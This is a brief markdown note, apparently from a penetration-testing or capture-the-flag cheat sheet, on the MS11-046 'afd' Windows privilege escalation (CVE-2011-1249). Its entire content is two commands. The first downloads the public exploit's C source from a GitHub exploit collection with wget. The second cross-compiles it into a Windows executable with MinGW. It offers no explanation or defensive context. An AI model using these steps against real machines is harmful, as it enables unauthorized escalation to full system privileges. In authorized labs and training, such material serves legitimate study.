
# MS11-046 afd privilege escalation

```bash
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS11-046/CVE-2011-1249.c

i686-w64-mingw32-gcc CVE-2011-1249.c -lws2_32 -o ms11-046.exe
```